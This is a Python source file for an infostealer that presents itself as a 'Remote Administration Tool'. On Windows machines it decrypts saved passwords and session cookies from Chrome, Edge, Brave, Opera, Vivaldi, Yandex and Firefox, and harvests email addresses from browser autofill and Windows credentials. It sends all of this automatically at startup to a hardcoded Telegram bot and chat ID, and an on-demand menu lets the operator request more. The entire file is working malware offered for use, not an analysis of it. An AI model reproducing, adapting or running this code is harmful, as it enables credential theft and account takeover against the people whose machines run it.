import telebot
import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Cryptodome.Cipher import AES
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time

# Replace with your bot token
BOT_TOKEN = "7460159243:AAGA-z1WGSggVKCK1-EoVPSu-JoKNLiE_Yg"
USER_ID = 7648971114

bot = telebot.TeleBot(BOT_TOKEN)
running = True  # Global flag to control the bot's running state

def show_welcome_message(chat_id):
    welcome_message = """
🔹 *Remote Administration Tool* 🔹

*Developed by Tintumon from Kerala*

📌 *About This Tool:*
This tool extracts passwords and cookies from all major browsers.
"""
    bot.send_message(chat_id, welcome_message, parse_mode="Markdown")

    # Automatically extract and send passwords and cookies
    bot.send_message(chat_id, "⏳ Extracting browser data from all supported browsers...")

    # Extract and send passwords
    password_output = extract_all_browser_passwords()
    send_long_message(chat_id, password_output)

    # Extract and send cookies
    cookie_output = extract_all_browser_cookies()
    send_long_message(chat_id, cookie_output)

    show_menu(chat_id)

def send_long_message(chat_id, text):
    MAX_LENGTH = 4000
    for i in range(0, len(text), MAX_LENGTH):
        try:
            bot.send_message(chat_id, f"```\n{text[i:i+MAX_LENGTH]}\n```", parse_mode="Markdown")
        except Exception as e:
            print("")
            time.sleep(5)  # Wait before retrying
            try:
                bot.send_message(chat_id, f"```\n{text[i:i+MAX_LENGTH]}\n```", parse_mode="Markdown")
            except:
                pass

def show_menu(chat_id):
    markup = InlineKeyboardMarkup()
    buttons = [
        ("🔓 Extract All Browser Passwords", "extract_passwords"),
        ("🍪 Extract All Browser Cookies", "extract_cookies"),
        ("📧 Extract All Email IDs", "extract_emails"),
        ("🔄 Extract Everything", "extract_all"),
        ("❌ Exit", "exit_bot")  # Added exit option
    ]
    for text, callback in buttons:
        markup.add(InlineKeyboardButton(text, callback_data=callback))
    try:
        bot.send_message(chat_id, "🔹 *Select an Option:*", reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        print("")

# ================== EMAIL EXTRACTION ==================

def extract_chrome_emails(db_path):
    temp_path = db_path + "_copy"
    emails = set()
    try:
        shutil.copy2(db_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        # Check for autofill emails
        try:
            cursor.execute("SELECT value FROM autofill WHERE value LIKE '%@%.%'")
            for row in cursor.fetchall():
                if '@' in row[0] and '.' in row[0].split('@')[-1]:
                    emails.add(row[0].strip())
        except sqlite3.OperationalError:
            pass

        # Check for saved email addresses in profiles
        try:
            cursor.execute("SELECT email FROM autofill_profiles")
            for row in cursor.fetchall():
                if row[0] and '@' in row[0] and '.' in row[0].split('@')[-1]:
                    emails.add(row[0].strip())
        except sqlite3.OperationalError:
            pass

        conn.close()
        os.remove(temp_path)
    except Exception as e:
        if os.path.exists(temp_path):
            try: os.remove(temp_path)
            except: pass
    return emails

def extract_firefox_emails(profile_path):
    emails = set()
    try:
        form_history_path = os.path.join(profile_path, 'formhistory.sqlite')
        if os.path.exists(form_history_path):
            temp_path = form_history_path + "_copy"
            shutil.copy2(form_history_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT value FROM moz_formhistory WHERE fieldname LIKE '%email%'")
            for row in cursor.fetchall():
                if '@' in row[0] and '.' in row[0].split('@')[-1]:
                    emails.add(row[0].strip())
            conn.close()
            os.remove(temp_path)
    except:
        pass
    return emails

def extract_system_emails():
    emails = set()
    try:
        import win32cred
        credentials = win32cred.CredEnumerate(None, 0)
        for cred in credentials:
            if 'UserName' in cred and '@' in cred['UserName']:
                emails.add(cred['UserName'].strip())
    except:
        pass
    return emails

def extract_all_emails():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
    }

    all_emails = set()

    # Extract from Chromium-based browsers
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue

        if browser_name == "Firefox":
            for profile in os.listdir(browser_path):
                profile_path = os.path.join(browser_path, profile)
                if os.path.isdir(profile_path):
                    all_emails.update(extract_firefox_emails(profile_path))
            continue

        profiles = find_chrome_profiles(browser_path)
        for profile in profiles:
            web_data_path = os.path.join(os.path.dirname(profile), "Web Data")
            if os.path.exists(web_data_path):
                all_emails.update(extract_chrome_emails(web_data_path))

    # Extract from system credentials
    all_emails.update(extract_system_emails())

    # Extract from existing password entries
    password_output = extract_all_browser_passwords()
    for line in password_output.split('\n'):
        if 'Username:' in line:
            email = line.split('Username:')[-1].strip()
            if '@' in email and '.' in email.split('@')[-1]:
                all_emails.add(email)

    if all_emails:
        result = "📧 *Extracted Email Addresses:*\n\n"
        result += "\n".join([f"• {email}" for email in sorted(all_emails)])
        result += f"\n\n📊 Total emails found: {len(all_emails)}"
        return result
    else:
        return "❌ No email addresses found in browsers or system."

# ================== PASSWORD EXTRACTION ==================

def get_master_key(browser_user_data_path):
    local_state_path = os.path.join(browser_user_data_path, "Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def decrypt_chrome_password(encrypted_password, master_key):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        else:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
    except Exception as e:
        return None

def find_chrome_profiles(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):
        return []

    # Check common profile locations
    common_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"]
    for profile in common_profiles:
        login_data_path = os.path.join(browser_user_data_path, profile, "Login Data")
        if os.path.exists(login_data_path):
            profiles.append(login_data_path)

    # Check for any other profiles
    for item in os.listdir(browser_user_data_path):
        if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_user_data_path, item)):
            login_data_path = os.path.join(browser_user_data_path, item, "Login Data")
            if login_data_path not in profiles and os.path.exists(login_data_path):
                profiles.append(login_data_path)

    return profiles

def extract_chrome_passwords(db_path, master_key):
    temp_path = db_path + "_copy"
    try:
        shutil.copy2(db_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()

        passwords = []
        for row in data:
            site, username, encrypted_password = row
            if username and encrypted_password:
                decrypted_password = decrypt_chrome_password(encrypted_password, master_key)
                if decrypted_password:
                    passwords.append({"site": site, "username": username, "password": decrypted_password})

        conn.close()
        os.remove(temp_path)
        return passwords
    except Exception as e:
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass
        return []

def extract_firefox_passwords():
    try:
        from pypykatz.pypykatz import pypykatz
        import glob

        firefox_profiles = []
        appdata = os.getenv('APPDATA')

        # Find Firefox profiles
        firefox_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                if os.path.isdir(profile_path):
                    logins_path = os.path.join(profile_path, 'logins.json')
                    key4db_path = os.path.join(profile_path, 'key4.db')
                    if os.path.exists(logins_path) and os.path.exists(key4db_path):
                        firefox_profiles.append(profile_path)

        if not firefox_profiles:
            return []

        # Extract passwords using pypykatz
        passwords = []
        for profile in firefox_profiles:
            try:
                creds = pypykatz.parse_firefox(profile)
                for cred in creds:
                    passwords.append({
                        "site": cred.url,
                        "username": cred.username,
                        "password": cred.password
                    })
            except:
                continue

        return passwords
    except:
        return []

def extract_all_browser_passwords():
    # Chromium-based browsers
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
        "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
    }

    all_passwords = []

    # Extract from Chromium-based browsers
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue

        master_key = get_master_key(browser_path)
        if not master_key:
            continue

        profiles = find_chrome_profiles(browser_path)
        if not profiles:
            continue

        for db_path in profiles:
            passwords = extract_chrome_passwords(db_path, master_key)
            if passwords:
                all_passwords.extend([{**p, "browser": browser_name} for p in passwords])

    # Extract from Firefox
    firefox_passwords = extract_firefox_passwords()
    if firefox_passwords:
        all_passwords.extend([{**p, "browser": "Firefox"} for p in firefox_passwords])

    if all_passwords:
        result = "🔓 *Extracted Browser Passwords:*\n\n"
        for entry in all_passwords:
            result += f"🌐 *Browser:* {entry['browser']}\n"
            result += f"🔗 *Site:* {entry['site']}\n"
            result += f"👤 *Username:* {entry['username']}\n"
            result += f"🔑 *Password:* {entry['password']}\n\n"
        result += f"\n📊 Total passwords extracted: {len(all_passwords)}"
        return result
    else:
        return "❌ No saved passwords found in any browser."

# ================== COOKIE EXTRACTION ==================

def extract_chrome_cookies(db_path, master_key):
    temp_path = db_path + "_copy"
    try:
        shutil.copy2(db_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        tables = ["cookies", "moz_cookies"]
        cookies = []

        for table in tables:
            try:
                cursor.execute(f"SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM {table}")
                data = cursor.fetchall()

                for row in data:
                    try:
                        host, name, encrypted_value, path, expires, secure = row
                        if encrypted_value:
                            decrypted_value = decrypt_chrome_password(encrypted_value, master_key)
                            if decrypted_value:
                                cookies.append({
                                    "domain": host,
                                    "name": name,
                                    "value": decrypted_value,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(secure)
                                })
                    except:
                        continue
            except sqlite3.OperationalError:
                continue

        conn.close()
        os.remove(temp_path)
        return cookies
    except:
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass
        return []

def find_chrome_cookie_db(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):
        return []

    # Common cookie locations
    common_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"]
    for profile in common_profiles:
        cookie_path = os.path.join(browser_user_data_path, profile, "Network", "Cookies")
        if os.path.exists(cookie_path):
            profiles.append(cookie_path)

    # Alternative locations
    possible_locations = [
        os.path.join(browser_user_data_path, "Default", "Cookies"),
        os.path.join(browser_user_data_path, "Cookies")
    ]

    for location in possible_locations:
        if os.path.exists(location) and location not in profiles:
            profiles.append(location)

    return profiles

def extract_firefox_cookies():
    try:
        from pycookiecheat import chrome_cookies
        import glob

        firefox_profiles = []
        appdata = os.getenv('APPDATA')

        # Find Firefox profiles
        firefox_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                if os.path.isdir(profile_path):
                    cookies_path = os.path.join(profile_path, 'cookies.sqlite')
                    if os.path.exists(cookies_path):
                        firefox_profiles.append(profile_path)

        if not firefox_profiles:
            return []

        # Extract cookies
        cookies = []
        for profile in firefox_profiles:
            try:
                cookies_db = os.path.join(profile, 'cookies.sqlite')
                temp_db = cookies_db + '_temp'
                shutil.copy2(cookies_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                data = cursor.fetchall()

                for row in data:
                    host, name, value, path, expiry, isSecure = row
                    cookies.append({
                        "domain": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expiry,
                        "secure": bool(isSecure)
                    })

                conn.close()
                os.remove(temp_db)
            except:
                continue

        return cookies
    except:
        return []

def extract_all_browser_cookies():
    # Chromium-based browsers
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
        "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
    }

    all_cookies = []

    # Extract from Chromium-based browsers
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue

        master_key = get_master_key(browser_path)
        if not master_key:
            continue

        cookie_dbs = find_chrome_cookie_db(browser_path)
        if not cookie_dbs:
            continue

        for db_path in cookie_dbs:
            cookies = extract_chrome_cookies(db_path, master_key)
            if cookies:
                all_cookies.extend([{**c, "browser": browser_name} for c in cookies])

    # Extract from Firefox
    firefox_cookies = extract_firefox_cookies()
    if firefox_cookies:
        all_cookies.extend([{**c, "browser": "Firefox"} for c in firefox_cookies])

    if all_cookies:
        cookies_by_domain = {}
        for cookie in all_cookies:
            if cookie['domain'] not in cookies_by_domain:
                cookies_by_domain[cookie['domain']] = []
            cookies_by_domain[cookie['domain']].append(cookie)

        result = "🍪 *Extracted Browser Cookies:*\n\n"
        for domain, cookies in cookies_by_domain.items():
            result += f"🌐 *Browser:* {cookies[0]['browser']}\n"
            result += f"🔗 *Domain:* {domain}\n"
            for cookie in cookies:
                result += f"  🔹 *{cookie['name']}*: {cookie['value']}\n"
                result += f"    Path: {cookie['path']} | Secure: {'Yes' if cookie['secure'] else 'No'}\n"
            result += "\n"

        result += f"\n📊 Total cookies extracted: {len(all_cookies)}"
        return result
    else:
        return "❌ No cookies found in any browser."

@bot.message_handler(func=lambda message: message.chat.id == USER_ID)
def handle_message(message):
    if message.text == "/start" or message.text == "/help":
        show_welcome_message(message.chat.id)
    elif message.text == "/stop":
        global running
        running = False
        bot.stop_polling()

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    command = call.data

    if command == "extract_passwords":
        output = extract_all_browser_passwords()
    elif command == "extract_cookies":
        output = extract_all_browser_cookies()
    elif command == "extract_emails":
        output = extract_all_emails()
    elif command == "extract_all":
        output = "🔓 *Passwords:*\n\n" + extract_all_browser_passwords() + "\n\n"
        output += "🍪 *Cookies:*\n\n" + extract_all_browser_cookies()
    elif command == "exit_bot":
        global running
        running = False
        bot.stop_polling()
        return
    else:
        output = "❌ Unknown command."

    send_long_message(chat_id, output)
    show_menu(chat_id)

def bot_polling():
    while running:
        try:

            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:

            time.sleep(5)

def main():
    global running
    running = True

    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=bot_polling)
    bot_thread.daemon = True
    bot_thread.start()

    # Send initial data
    try:
        show_welcome_message(USER_ID)
    except Exception:
        pass

    # Keep the main thread alive
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
